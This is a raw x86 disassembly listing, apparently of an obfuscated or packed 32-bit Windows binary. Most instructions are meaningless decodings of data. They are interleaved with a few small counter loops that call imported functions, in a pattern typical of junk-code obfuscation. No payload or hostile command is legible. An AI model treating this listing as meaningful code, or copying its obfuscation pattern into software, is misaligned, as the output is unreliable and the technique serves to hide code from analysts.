  407b18:	outs   dx,DWORD PTR ds:[esi]
  407b19:	int    0x54
  407b1b:	int3   
  407b1c:	jo     0x407b8e
  407b1e:	imul   edi,DWORD PTR [edi+0x70],0x3d371770
  407b25:	ret    0x6574
  407b28:	mov    WORD PTR [ecx-0x62fe44bc],cs
  407b2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b2f:	add    BYTE PTR [edi],bl
  407b31:	mov    edi,0x1d3947e0
  407b36:	mov    edx,0xd59720c0
  407b3b:	xchg   ax,ax
  407b3d:	mov    edi,0x6066918
  407b42:	fild   WORD PTR [ebx]
  407b44:	data16 clc 
  407b46:	loope  0x407add
  407b48:	pop    ebx
  407b49:	int3   
  407b4a:	jmp    0x407b06
  407b4c:	adc    al,0x20
  407b4e:	mov    dl,BYTE PTR [eax]
  407b50:	hlt    
  407b51:	xchg   esp,eax
  407b52:	jnp    0x407b50
  407b54:	rol    BYTE PTR [ebx+0x1d],0x25
  407b58:	fwait
  407b59:	xchg   esp,eax
  407b5a:	stos   DWORD PTR es:[edi],eax
  407b5b:	mov    edx,0x89e99e5b
  407b60:	adc    ecx,DWORD PTR [ebx]
  407b62:	cmp    eax,0xb1381fc2
  407b67:	test   dh,ah
  407b69:	adc    al,0xba
  407b6b:	fnstsw WORD PTR [edx]
  407b6d:	ret    
  407b6e:	jbe    0x407b72
  407b70:	gs jne 0x407b70
  407b73:	pop    ecx
  407b74:	xor    ebx,DWORD PTR [edx+0x26]
  407b77:	ja     0x407b41
  407b79:	scas   al,BYTE PTR es:[edi]
  407b7a:	test   BYTE PTR [ebp+esi*4+0x44b4e5a4],bh
  407b81:	scas   eax,DWORD PTR es:[edi]
  407b82:	pop    edx
  407b83:	stos   BYTE PTR es:[edi],al
  407b84:	and    edx,DWORD PTR [eax+eax*1+0x788d0908]
  407b8b:	in     eax,0xb5
  407b8d:	xchg   ebp,eax
  407b8e:	xor    eax,0x75f4e5a9
  407b93:	pop    ecx
  407b94:	pop    ebp
  407b95:	mov    eax,0x383a32fe
  407b9a:	aam    0xc9
  407b9c:	push   0x9ffaffbc
  407ba1:	das    
  407ba2:	in     eax,0x38
  407ba4:	pop    ss
  407ba5:	rcr    BYTE PTR [ecx+0xa8d21],0x5d
  407bac:	and    bh,cl
  407bae:	pop    es
  407baf:	jl     0x407ba7
  407bb1:	inc    ebp
  407bb2:	push   edi
  407bb3:	pop    ecx
  407bb4:	mov    edx,0x5fbf561f
  407bb9:	mov    gs,WORD PTR [esp+ebp*8-0x13163e70]
  407bc0:	push   es
  407bc1:	jg     0x407c03
  407bc3:	mov    dh,0x68
  407bc5:	pop    esi
  407bc6:	retf   
  407bc7:	repz mov ds:0x6562636b,al
  407bcd:	cmp    ah,ah
  407bcf:	shr    BYTE PTR [ebx+0x2d302622],1
  407bd5:	adc    BYTE PTR [eax],ch
  407bd7:	mov    eax,gs
  407bd9:	cmp    al,0x97
  407bdb:	ret    
  407bdc:	hlt    
  407bdd:	push   ecx
  407bde:	in     eax,0xc2
  407be0:	icebp  
  407be1:	pop    ebx
  407be2:	jmp    0x407c0e
  407be4:	js     0x407b81
  407be6:	pmulhuw mm5,QWORD PTR [ecx-0x71]
  407bea:	fst    QWORD PTR [esi-0x5a]
  407bed:	stc    
  407bee:	adc    ch,BYTE PTR [edx]
  407bf0:	jge    0x407c13
  407bf2:	das    
  407bf3:	or     BYTE PTR [ebp+0x72],ah
  407bf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bf7:	xor    cl,BYTE PTR [ebx-0x3b672408]
  407bfd:	cs sbb eax,0x8a860164
  407c03:	mov    esi,0x7344c07a
  407c08:	xchg   esi,eax
  407c09:	and    eax,0x3d043b4d
  407c0e:	adc    bh,BYTE PTR [esp+eiz*2-0x13c1ddad]
  407c15:	mov    eax,0xaf7bc88a
  407c1a:	gs jae 0x407c72
  407c1d:	addr16 cld 
  407c1f:	inc    esi
  407c20:	sub    ch,BYTE PTR [ebx+0xa]
  407c23:	or     eax,0x70b4226a
  407c28:	and    al,dh
  407c2a:	lds    esp,FWORD PTR fs:[eax+edi*1-0x65]
  407c2f:	(bad)  
  407c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c31:	stos   DWORD PTR es:[edi],eax
  407c32:	and    al,0x4f
  407c34:	aaa    
  407c35:	lods   al,BYTE PTR ds:[esi]
  407c36:	jmp    0x407c3e
  407c38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c39:	fstp   TBYTE PTR [ebp+eiz*1+0x4c]
  407c3d:	jp     0x407c01
  407c3f:	dec    edx
  407c40:	test   eax,0xc7689657
  407c45:	div    DWORD PTR [ebx+0x5cc4842f]
  407c4b:	add    al,0xbe
  407c4d:	or     bh,BYTE PTR [edi]
  407c4f:	inc    ecx
  407c50:	daa    
  407c51:	je     0x407c3e
  407c53:	int3   
  407c54:	add    al,0x19
  407c56:	in     eax,dx
  407c57:	xor    al,0x9c
  407c59:	sbb    eax,0x900c88bd
  407c5e:	dec    esi
  407c5f:	add    al,0x63
  407c61:	sub    dh,BYTE PTR [ebx-0x248deee1]
  407c67:	inc    ebp
  407c68:	jb     0x407c6b
  407c6a:	push   ebp
  407c6b:	inc    esi
  407c6c:	or     al,0xe7
  407c6e:	pop    ebp
  407c6f:	mov    eax,ds:0x36d634cf
  407c74:	inc    eax
  407c75:	sahf   
  407c76:	push   es
  407c77:	daa    
  407c78:	(bad)
  407c7c:	adc    BYTE PTR [ecx+0x7e],bh
  407c7f:	in     al,dx
  407c80:	(bad)
  407c83:	push   esi
  407c84:	mov    ds:0xe073b2ea,al
  407c89:	bound  edx,QWORD PTR [ebx-0x785293f0]
  407c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c90:	xchg   ecx,eax
  407c91:	mov    ah,0x88
  407c93:	cmp    al,0x99
  407c95:	cmp    bh,BYTE PTR [edx-0x98c8ee9]
  407c9b:	outs   dx,DWORD PTR ds:[esi]
  407c9c:	xchg   ecx,eax
  407c9d:	xor    dl,dh
  407c9f:	sub    edi,DWORD PTR [ebx]
  407ca1:	mov    DWORD PTR [esi+0x7b],0xb2a60d7b
  407ca8:	xchg   DWORD PTR [esi-0x68cc001d],esi
  407cae:	mov    ds:0xc4245266,eax
  407cb3:	fistp  WORD PTR ds:0x83fc723d
  407cb9:	mov    ah,0x1
  407cbb:	addr16 int3 
  407cbd:	pop    ebp
  407cbe:	push   es
  407cbf:	out    0x2c,al
  407cc1:	inc    esi
  407cc2:	jb     0x407cdb
  407cc4:	push   ebx
  407cc5:	popa   
  407cc6:	jo     0x407c90
  407cc8:	cmp    bl,dh
  407cca:	jle    0x407ce7
  407ccc:	add    DWORD PTR [edx+0x62fc772b],esp
  407cd2:	and    ah,BYTE PTR [ebp+0x57f034]
  407cd8:	dec    esi
  407cd9:	mov    bh,BYTE PTR [ebx+0x28]
  407cdc:	iret   
  407cdd:	int3   
  407cde:	dec    eax
  407cdf:	jns    0x407d20
  407ce1:	(bad)  
  407ce2:	stos   DWORD PTR es:[edi],eax
  407ce3:	(bad)  
  407ce5:	xchg   ecx,eax
  407ce6:	test   ecx,ebx
  407ce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ce9:	pop    es
  407cea:	cmp    eax,0x8928918a
  407cef:	loop   0x407d61
  407cf1:	xchg   BYTE PTR [ebx-0x76],dl
  407cf4:	inc    esp
  407cf5:	dec    esi
  407cf6:	jb     0x407cc8
  407cf8:	inc    eax
  407cf9:	dec    BYTE PTR [edi+0x351ab765]
  407cff:	and    BYTE PTR [ebx-0x3a],cl
  407d02:	pop    edx
  407d03:	dec    edx
  407d04:	int3   
  407d05:	arpl   WORD PTR [esi+0x6c],dx
  407d08:	mov    esp,0x2ebe6424
  407d0d:	mov    ds:0xd541ef4a,eax
  407d12:	xchg   edi,eax
  407d13:	test   ebp,0xe0e83cf4
  407d19:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  407d20:	mov    DWORD PTR ds:0x43438e,0x1a
  407d2a:	cmp    DWORD PTR ds:0x43438e,0x0
  407d31:	je     0x407d7e
  407d37:	cmp    DWORD PTR ds:0x43438e,0x7
  407d3e:	jne    0x407d4c
  407d44:	push   0x9
  407d46:	call   DWORD PTR ds:0x4329ce
  407d4c:	cmp    DWORD PTR ds:0x43438e,0x8
  407d53:	jne    0x407d66
  407d59:	mov    edi,DWORD PTR ds:0x43438e
  407d5f:	dec    edi
  407d60:	mov    DWORD PTR ds:0x43438e,edi
  407d66:	mov    edi,DWORD PTR ds:0x43438e
  407d6c:	dec    edi
  407d6d:	mov    DWORD PTR ds:0x43438e,edi
  407d73:	jmp    0x407d2a
  407d78:	adc    DWORD PTR ds:0x432dce,ecx
  407d7e:	mov    edx,DWORD PTR [ebp+0x8]
  407d81:	xor    edx,eax
  407d83:	sbb    edi,DWORD PTR ds:0x43439a
  407d89:	mov    edi,DWORD PTR [ebp-0x10]
  407d8c:	add    edx,ecx
  407d8e:	cmp    edi,edx
  407d90:	jmp    0x407fa4
  407d95:	mov    BYTE PTR [ebp+0x51b14fb4],ch
  407d9b:	jae    0x407e12
  407d9d:	xchg   esp,eax
  407d9e:	xor    al,0x31
  407da0:	xchg   BYTE PTR [esi+0x12],dl
  407da3:	xchg   eax,esp
  407da5:	dec    ebp
  407da6:	retf   0x7070
  407da9:	imul   edi,DWORD PTR [edi+0x70],0xc9b5cb70
  407db0:	sti    
  407db1:	xchg   ebx,eax
  407db2:	add    eax,0x328352aa
  407db7:	mov    esi,0xfb24fb09
  407dbc:	fs push ds
  407dbe:	push   cs
  407dbf:	enter  0xb253,0x73
  407dc3:	push   ebx
  407dc4:	test   BYTE PTR [ebx-0x465d4a66],ah
  407dca:	jg     0x407da4
  407dcc:	inc    esi
  407dcd:	jne    0x407e41
  407dcf:	out    0xb5,eax
  407dd1:	lea    ebp,[ebx+0x21]
  407dd4:	jg     0x407e27
  407dd6:	mov    ds:0x5af84d86,al
  407ddb:	push   edx
  407ddc:	(bad)  
  407dde:	outs   dx,BYTE PTR ds:[esi]
  407ddf:	inc    ecx
  407de0:	inc    edi
  407de1:	pmuludq mm6,QWORD PTR [edi]
  407de4:	and    DWORD PTR [ebp-0x66],edi
  407de7:	dec    edi
  407de8:	pop    ebp
  407de9:	aas    
  407dea:	add    ch,ah
  407dec:	ins    DWORD PTR es:[edi],dx
  407ded:	inc    edi
  407dee:	cmp    ebx,DWORD PTR [ebp+ecx*2+0x18]
  407df2:	xchg   edi,eax
  407df3:	int    0xf3
  407df5:	lods   al,BYTE PTR ds:[esi]
  407df6:	imul   ecx,DWORD PTR [edi+0x64869e01],0xb49b8496
  407e00:	icebp  
  407e01:	pop    edx
  407e02:	rol    ah,cl
  407e04:	inc    ebx
  407e05:	sbb    al,BYTE PTR [ecx]
  407e07:	data16 mov bh,0x87
  407e0a:	lods   eax,DWORD PTR ds:[esi]
  407e0b:	fucom  st(3)
  407e0d:	cmp    al,0xb5
  407e0f:	aas    
  407e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e11:	lods   al,BYTE PTR ds:[esi]
  407e12:	add    bh,BYTE PTR [eax-0x54]
  407e15:	jecxz  0x407dd7
  407e17:	fs in  eax,0x4f
  407e1a:	dec    ebp
  407e1b:	jbe    0x407e9a
  407e1d:	inc    eax
  407e1e:	cmp    eax,0x44c1b8e5
  407e23:	dec    esp
  407e24:	or     al,0xdd
  407e26:	sub    al,0xbe
  407e28:	jmp    0x1cbf:0xcbde4358
  407e2f:	call   0x2570a2bf
  407e34:	jp     0x407dd1
  407e36:	xchg   ebp,eax
  407e37:	rol    DWORD PTR [ebp-0x78],cl
  407e3a:	mov    ss,WORD PTR [ebp-0x5b]
  407e3d:	pop    ss
  407e3e:	aam    0xd6
  407e40:	fdivr  QWORD PTR [edi+0x7d]
  407e43:	and    eax,0x3381cfbd
  407e48:	lods   eax,DWORD PTR ds:[esi]
  407e49:	xor    al,0x7d
  407e4b:	inc    ebp
  407e4c:	jns    0x407ea8
  407e4e:	xchg   ecx,eax
  407e4f:	ret    
  407e50:	leave  
  407e51:	loop   0x407e4f
  407e53:	ins    DWORD PTR es:[edi],dx
  407e54:	push   ebx
  407e55:	inc    edx
  407e56:	cmp    eax,0x9badd6dc
  407e5b:	pop    esp
  407e5c:	je     0x407e6b
  407e5e:	cdq    
  407e5f:	fstp   QWORD PTR ds:0x65f636f4
  407e65:	sbb    eax,DWORD PTR [ebp-0x47]
  407e68:	test   DWORD PTR [esi+ebx*8+0x45],eax
  407e6c:	inc    eax
  407e6d:	addr16 mov ds:0xfbe,eax
  407e71:	xchg   ebx,eax
  407e72:	mov    al,ds:0xf2d1e01d
  407e77:	jecxz  0x407e3b
  407e79:	fs popf 
  407e7b:	ds out dx,al
  407e7d:	retf   0x56b
  407e80:	pop    eax
  407e81:	int3   
  407e82:	add    al,0x84
  407e84:	sub    eax,DWORD PTR [esi]
  407e86:	adc    DWORD PTR [edi],edi
  407e88:	retf   
  407e89:	addr16 jb 0x407ed4
  407e8c:	xor    eax,0xf9a02970
  407e91:	out    0xcf,eax
  407e93:	push   0x3a
  407e95:	cmp    ah,BYTE PTR [ebx+0x7a]
  407e98:	jmp    0xb493:0xf2d63c78
  407e9f:	cmp    ch,BYTE PTR [edx+ebp*8]
  407ea2:	mov    esi,DWORD PTR [esi+0x1d77e3df]
  407ea8:	stos   BYTE PTR es:[edi],al
  407ea9:	mov    WORD PTR [edi-0x54],ss
  407eac:	xlat   BYTE PTR ds:[ebx]
  407ead:	mov    al,ds:0x189d6d8e
  407eb2:	test   BYTE PTR [edx-0x49],dh
  407eb5:	mov    WORD PTR [ecx],fs
  407eb7:	icebp  
  407eb8:	pusha  
  407eb9:	test   DWORD PTR [edi+0x2a],ecx
  407ebc:	nop
  407ebd:	jge    0x407e74
  407ebf:	aad    0xf3
  407ec1:	sbb    edi,DWORD PTR [edx-0x5e87f445]
  407ec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ec8:	pop    esi
  407ec9:	in     al,dx
  407eca:	ins    DWORD PTR es:[edi],dx
  407ecb:	cmc    
  407ecc:	pop    ecx
  407ecd:	mov    edx,DWORD PTR fs:[edx]
  407ed0:	imul   eax,DWORD PTR [edx-0x6],0x1b4d4d09
  407ed7:	bnd jb 0x407ea6
  407eda:	mov    al,0x58
  407edc:	imul   edx,DWORD PTR [esi-0xc],0xfc742d0c
  407ee3:	and    eax,0x52ef5b7d
  407ee8:	and    DWORD PTR [ebp+0xf],ebp
  407eeb:	test   al,0x4e
  407eed:	mov    al,ds:0xea1c59af
  407ef2:	jne    0x407f40
  407ef4:	cmp    eax,0x783cef9f
  407ef9:	out    0xfb,eax
  407efb:	(bad)  
  407efc:	push   esp
  407efd:	inc    eax
  407efe:	bound  ebx,QWORD PTR [esi+0x1f5649d4]
  407f04:	sahf   
  407f05:	lea    edx,ds:0xef6135ab
  407f0b:	push   0xffffffb4
  407f0d:	mov    eax,0x8d5e7f2
  407f12:	mov    bl,0x7f
  407f14:	inc    ebp
  407f15:	inc    eax
  407f16:	pop    edx
  407f17:	cwde   
  407f18:	call   0x52d12577
  407f1d:	inc    ebx
  407f1e:	(bad)  
  407f1f:	ja     0x407f5f
  407f21:	fimul  WORD PTR [ecx-0x3e3146ca]
  407f27:	mul    bh
  407f29:	into   
  407f2a:	(bad)  
  407f2b:	imul   BYTE PTR [ecx+esi*4+0x31e1c4e5]
  407f32:	add    eax,0x55671374
  407f37:	in     eax,0x88
  407f39:	cmp    eax,ebp
  407f3b:	fisttp DWORD PTR [ebx+0x26f591c1]
  407f41:	push   ebp
  407f42:	adc    eax,0x6a3e354e
  407f47:	pop    ss
  407f48:	jnp    0x407f13
  407f4a:	in     eax,dx
  407f4b:	add    esp,eax
  407f4d:	sub    esi,DWORD PTR [edi]
  407f4f:	test   DWORD PTR [ebp+ebp*4+0x1ce421f4],eax
  407f56:	dec    eax
  407f57:	jmp    0x41ce:0xd4c64634
  407f5e:	aaa    
  407f5f:	inc    ecx
  407f60:	mov    esp,0xdf1da29a
  407f65:	xor    ah,ah
  407f67:	lds    ebx,FWORD PTR [ebp+0x25]
  407f6a:	and    al,0xde
  407f6c:	aam    0x19
  407f6e:	loope  0x407faa
  407f70:	jne    0x407f66
  407f72:	adc    edi,DWORD PTR [ebp+0x7498ce6d]
  407f78:	outs   dx,BYTE PTR ds:[esi]
  407f79:	repnz cmp ch,dl
  407f7c:	adc    dh,BYTE PTR [edx+0x782694f4]
  407f82:	push   eax
  407f83:	addr16 loop 0x407fe4
  407f86:	fcom   DWORD PTR [ecx]
  407f88:	pop    ecx
  407f89:	ror    DWORD PTR [ebx-0x66b6c2cc],1
  407f8f:	dec    esp
  407f90:	outs   dx,BYTE PTR ds:[esi]
  407f91:	pusha  
  407f92:	daa    
  407f93:	loop   0x407fe7
  407f95:	cmp    al,0x6e
  407f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f98:	pop    ebp
  407f99:	retf   
  407f9a:	ja     0x407fc0
  407f9c:	lea    edx,[eax+eax*4]
  407f9f:	jp     0x407fc7
  407fa1:	call   0x844fcff1
  407fa6:	dec    ecx
  407fa7:	sbb    eax,0xc7530000
  407fac:	add    eax,0x43437a
  407fb1:	cmp    ah,BYTE PTR [eax+eax*1+0x0]
  407fb5:	jmp    0x409aba
  407fba:	mov    DWORD PTR ds:0x432708,0x445
  407fc4:	mov    edx,DWORD PTR [ebp-0x8]
  407fc7:	and    DWORD PTR ds:0x43438a,0x0
  407fd1:	jmp    0x407fe5
  407fd6:	xor    edi,edi
  407fd8:	or     edi,DWORD PTR ds:0x43438a
  407fde:	inc    edi
  407fdf:	mov    DWORD PTR ds:0x43438a,edi
  407fe5:	cmp    DWORD PTR ds:0x43438a,0x18
  407fec:	jae    0x40802f
  407ff2:	cmp    DWORD PTR ds:0x43438a,0xc
  407ff9:	jne    0x40800a
  407fff:	push   0x7154
  408004:	call   DWORD PTR ds:0x432c3e
  40800a:	cmp    DWORD PTR ds:0x43438a,0xb
  408011:	jne    0x408024
  408017:	mov    edi,DWORD PTR ds:0x43438a
  40801d:	inc    edi
  40801e:	mov    DWORD PTR ds:0x43438a,edi
  408024:	jmp    0x407fd6
  408029:	xor    DWORD PTR ds:0x43439e,ecx
  40802f:	mov    edi,DWORD PTR [ebp-0x10]
  408032:	jmp    0x408246
  408037:	(bad)  
  408038:	jmp    0x408005
  40803a:	adc    ebp,DWORD PTR [ecx+0x33]
  40803d:	inc    esi
  40803e:	jno    0x40804f
  408040:	pushf  
  408041:	jo     0x407fca
  408043:	int3   
  408044:	push   esi
  408045:	add    bl,bh
  408047:	inc    esi
  408048:	enter  0x7070,0x69
  40804c:	jg     0x4080be
  40804e:	jo     0x4080bd
  408050:	pusha  
  408051:	mov    ?,WORD PTR ds:0x542f57f3
  408057:	xchg   DWORD PTR [eax+0x49],esp
  40805a:	lods   al,BYTE PTR ds:[esi]
  40805b:	sahf   
  40805c:	mov    cl,0x5
  40805e:	fwait
  40805f:	mov    dl,0xd5
  408061:	ins    DWORD PTR es:[edi],dx
  408062:	lods   al,BYTE PTR ds:[esi]
  408063:	ins    BYTE PTR es:[edi],dx
  408064:	enter  0x6370,0x4b
  408068:	scas   al,BYTE PTR es:[edi]
  408069:	fiadd  DWORD PTR [ecx-0x18afd615]
  40806f:	sub    BYTE PTR [ebx+ebx*4],0x7c
  408073:	lods   eax,DWORD PTR ds:[esi]
  408074:	ins    DWORD PTR es:[edi],dx
  408075:	pop    sp
  408077:	sub    eax,0x3d9c2d2b
  40807c:	leave  
  40807d:	adc    eax,0x2440def
  408082:	(bad)  [ebx-0x25538bd]
  408088:	push   es
  408089:	int3   
  40808a:	cmc    
  40808b:	pop    esp
  40808c:	adc    esp,DWORD PTR [eax+0x71aeb3dd]
  408092:	xlat   BYTE PTR ds:[ebx]
  408093:	outs   dx,DWORD PTR ds:[esi]
  408094:	sub    edx,DWORD PTR ds:0xe141368b
  40809a:	mov    dl,0xe1
  40809c:	adc    ch,BYTE PTR fs:[ebx]
  40809f:	loop   0x408093
  4080a1:	inc    edx
  4080a2:	xor    ecx,DWORD PTR [eax+esi*8]
  4080a5:	repnz fimul DWORD PTR [ebx]
  4080a8:	dec    ebx
  4080a9:	cdq    
  4080aa:	xchg   esi,eax
  4080ab:	pop    ecx
  4080ac:	jge    0x408045
  4080ae:	ficomp DWORD PTR [ecx+ebp*4+0x24]
  4080b2:	out    dx,eax
  4080b3:	in     eax,0x1f
  4080b5:	daa    
  4080b6:	inc    edx
  4080b7:	cli    
  4080b8:	xchg   ecx,ebp
  4080ba:	jp     0x4080cf
  4080bc:	push   ss
  4080bd:	jl     0x40805a
  4080bf:	int3   
  4080c0:	pop    ss
  4080c1:	(bad)  
  4080c2:	in     eax,0xf5
  4080c4:	dec    eax
  4080c5:	sahf   
  4080c6:	add    esi,ebx
  4080c8:	inc    edx
  4080c9:	push   ss
  4080ca:	xchg   esp,eax
  4080cb:	mov    eax,ds:0xceef214c
  4080d0:	push   0x7d
  4080d2:	cld    
  4080d3:	jge    0x40805f
  4080d5:	sbb    BYTE PTR [ebp-0x761adaf9],cl
  4080db:	lahf   
  4080dc:	mov    al,ds:0xbdba566a
  4080e1:	cmp    eax,0x942d11a7
  4080e6:	mov    ebp,0xc3a8ce9e
  4080eb:	cwde   
  4080ec:	pop    es
  4080ed:	je     0x4080ae
  4080ef:	icebp  
  4080f0:	outs   dx,DWORD PTR ds:[esi]
  4080f1:	mov    eax,0x4419a1b5
  4080f6:	or     esp,DWORD PTR [ebp-0xa]
  4080f9:	into   
  4080fa:	lahf   
  4080fb:	dec    ebx
  4080fc:	ror    dh,0x16
  4080ff:	and    DWORD PTR [ebx],ebx
  408101:	dec    ebp
  408102:	mov    esi,0x2ed93bff
  408107:	imul   ebx,DWORD PTR ds:[eax+0x2f],0xffffffb4
  40810c:	inc    edx
  40810d:	test   DWORD PTR [edi-0x11],ecx
  408110:	sbb    ecx,0xffffffde
  408113:	jle    0x40817e
  408115:	mov    ecx,0xd5a05ee0
  40811a:	sub    BYTE PTR ds:0x64d5,al
  40811f:	(bad)  
  408120:	pop    edi
  408121:	into   
  408122:	sbb    eax,0xa12f58e3
  408127:	lea    edi,[edx+0x3a]
  40812a:	inc    eax
  40812b:	mov    esi,0x64a8b62d
  408130:	xor    dl,BYTE PTR [eax-0x355775a6]
  408136:	sub    al,0xb6
  408138:	push   0x1a
  40813a:	stos   DWORD PTR es:[edi],eax
  40813b:	add    bl,BYTE PTR [ebp+0x5773aa12]
  408141:	aaa    
  408142:	dec    ebp
  408143:	aas    
  408144:	pop    edx
  408145:	daa    
  408146:	icebp  
  408147:	imul   edi,DWORD PTR [ecx-0x60b3b531],0x19594eee
  408151:	and    edi,0xffffffb0
  408154:	cmp    al,dh
  408156:	and    eax,0xdd198725
  40815b:	je     0x40814f
  40815d:	add    al,0xcd
  40815f:	mov    edi,?
  408161:	or     edx,DWORD PTR [edi+0x51]
  408164:	add    al,0x37
  408166:	cmp    al,0xba
  408168:	mov    ebx,0x9b0749ed
  40816d:	dec    esp
  40816e:	fldenv [ecx+0x319afed6]
  408174:	pop    ss
  408175:	mov    ebp,0x311793e4
  40817a:	sbb    al,ah
  40817c:	mov    ebx,0x7fecdce1
  408181:	add    dh,BYTE PTR [esi+edx*1]
  408184:	inc    esi
  408185:	push   0x628620a
  40818a:	mov    DWORD PTR [ebx-0x2],esi
  40818d:	nop
  40818e:	call   0x9e:0xda6fbf04
  408195:	mov    ah,0xa3
  408197:	pop    ebx
  408198:	in     al,0xdc
  40819a:	jmp    0x4081b1
  40819c:	push   ds
  40819d:	push   eax
  40819e:	adc    edi,edi
  4081a0:	std    
  4081a1:	inc    edx
  4081a2:	repnz push esi
  4081a4:	cs addr16 push 0x54546996
  4081ab:	outs   dx,BYTE PTR ds:[esi]
  4081ac:	clc    
  4081ad:	loope  0x408215
  4081af:	dec    edx
  4081b0:	add    DWORD PTR [ecx],edx
  4081b2:	stos   DWORD PTR es:[edi],eax
  4081b3:	hlt    
  4081b4:	pop    ebx
  4081b5:	sub    esp,edi
  4081b7:	gs cmp DWORD PTR ss:[ebx+esi*8-0x794997d0],esp
  4081c0:	jecxz  0x408215
  4081c2:	stc    
  4081c3:	out    dx,eax
  4081c4:	leave  
  4081c5:	jne    0x4081d6
  4081c7:	stos   BYTE PTR es:[edi],al
  4081c8:	out    dx,al
  4081c9:	test   DWORD PTR [ecx+0x5ebbd4b0],eax
  4081cf:	popa   
  4081d0:	jno    0x40816e
  4081d2:	ret    
  4081d3:	idiv   DWORD PTR [esi+0x7186ea0f]
  4081d9:	in     al,dx
  4081da:	cli    
  4081db:	fsubr  st,st(2)
  4081dd:	xchg   BYTE PTR [edx+esi*4-0x17],dl
  4081e1:	fcomi  st,st(1)
  4081e3:	jno    0x4081ac
  4081e5:	aaa    
  4081e6:	xchg   esp,eax
  4081e7:	repnz pop eax
  4081e9:	push   eax
  4081ea:	pop    es
  4081eb:	and    al,0x8f
  4081ed:	mov    edx,0xb4df5d39
  4081f2:	jno    0x408222
  4081f4:	mov    al,0x13
  4081f6:	jle    0x4081dc
  4081f8:	test   al,0x62
  4081fa:	jp     0x4081e0
  4081fc:	sbb    al,0xd8
  4081fe:	adc    eax,0x2c7d459a
  408203:	adc    ebp,edx
  408205:	mov    ebx,0x11191f21
  40820a:	and    cl,al
  40820c:	mov    bh,0x48
  40820e:	xor    eax,0x2be7c997
  408213:	mov    ebp,0x6eb8f2d
  408218:	jno    0x408281
  40821a:	mov    DWORD PTR [esi-0x7f226039],0xe023a485
  408224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408225:	sub    BYTE PTR [ecx],ah
  408227:	repnz pop ecx
  408229:	mov    esi,0x2f4202cf
  40822f:	xchg   BYTE PTR [edi],cl
  408231:	sbb    BYTE PTR [ebx+eax*2],cl
  408234:	push   0x34
  408236:	xchg   ebp,eax
  408237:	aas    
  408238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408239:	add    DWORD PTR [ecx-0x76],esp
  40823c:	arpl   WORD PTR [eax],bp
  40823e:	sub    eax,0x63ef26b6
  408243:	fucom  st(6)
  408245:	and    ch,BYTE PTR [ebx]
  408247:	cli    
  408248:	mov    edx,DWORD PTR [ebp-0x4]
  40824b:	xor    edx,eax
  40824d:	sbb    DWORD PTR ds:0x432de2,0x10fd
  408257:	add    edx,ecx
  408259:	mov    DWORD PTR ds:0x434372,0xe69
  408263:	cmp    edi,edx
  408265:	mov    DWORD PTR ds:0x434386,0xfd5
  40826f:	jmp    0x408483
  408274:	sbb    DWORD PTR [edi+eiz*4],ebp
  408277:	pop    edx
  408278:	mov    ch,0x71
  40827a:	loope  0x4082e7
  40827c:	push   ebx
  40827d:	inc    edx
  40827e:	test   al,0x19
  408280:	jnp    0x4082fc
  408282:	mov    dh,0xc7
  408284:	mov    edi,0x697070d6
  408289:	jg     0x4082fb
  40828b:	jo     0x40826b
  40828d:	lods   eax,DWORD PTR ds:[esi]
  40828e:	add    DWORD PTR [esi-0x64d6b53f],esp
  408294:	aam    0x91
  408296:	scas   al,BYTE PTR es:[edi]
  408297:	jl     0x408245
  408299:	jp     0x408231
  40829b:	bound  ebp,QWORD PTR [edx-0x1a358f79]
  4082a1:	(bad)  
  4082a2:	and    ah,BYTE PTR [ebx-0x4fe75ea]
  4082a8:	inc    esp
  4082a9:	call   FWORD PTR [ebx+0x75]
  4082ac:	pop    ebp
  4082ad:	aas    
  4082ae:	out    0xcc,al
  4082b0:	pop    ecx
  4082b1:	mov    ss,WORD PTR [ebp+0x48367bd1]
  4082b7:	lods   al,BYTE PTR ds:[esi]
  4082b8:	mov    es,WORD PTR [edi]
  4082ba:	pop    ecx
  4082bb:	sub    DWORD PTR [ecx],ebp
  4082bd:	inc    eax
  4082be:	arpl   WORD PTR ss:[esi-0x68877fc],sp
  4082c5:	mov    ah,0x73
  4082c7:	cmp    ch,cl
  4082c9:	sub    al,0x12
  4082cb:	in     eax,dx
  4082cc:	mov    cl,0x30
  4082ce:	cli    
  4082cf:	push   cs
  4082d0:	xchg   edi,eax
  4082d1:	push   eax
  4082d2:	scas   eax,DWORD PTR es:[edi]
  4082d3:	stc    
  4082d4:	leave  
  4082d5:	loop   0x408272
  4082d7:	dec    ecx
  4082d8:	dec    ebp
  4082d9:	pop    ecx
  4082da:	xchg   ebp,eax
  4082db:	jl     0x4082ad
  4082dd:	lds    edx,FWORD PTR [ecx+0x498a5de9]
  4082e3:	or     BYTE PTR [edx-0x37],cl
  4082e6:	out    0x7b,eax
  4082e8:	arpl   dx,bx
  4082ea:	call   0xdc607155
  4082ef:	pop    edi
  4082f0:	pop    esi
  4082f1:	dec    ebp
  4082f2:	data16 mov bl,dh
  4082f5:	rcl    DWORD PTR [edx+0x30af19d2],1
  4082fb:	pop    edx
  4082fc:	shl    ebp,0x68
  4082ff:	nop
  408300:	xchg   ecx,eax
  408301:	outs   dx,DWORD PTR ds:[esi]
  408302:	jl     0x4082d7
  408304:	lahf   
  408305:	enter  0xfb80,0xa9
  408309:	pop    esi
  40830a:	in     eax,dx
  40830b:	cmc    
  40830c:	pop    ebp
  40830d:	inc    edi
  40830e:	ins    BYTE PTR es:[edi],dx
  40830f:	scas   al,BYTE PTR es:[edi]
  408310:	daa    
  408311:	bswap  ebp
  408313:	fild   QWORD PTR [edi+0x4f5a6337]
  408319:	fst    QWORD PTR [edi+edx*4-0x22]
  40831d:	pop    ebp
  40831e:	stos   BYTE PTR es:[edi],al
  40831f:	fcom   DWORD PTR [ebx+eax*1+0x5394e509]
  408326:	sbb    eax,0xd5b05e5d
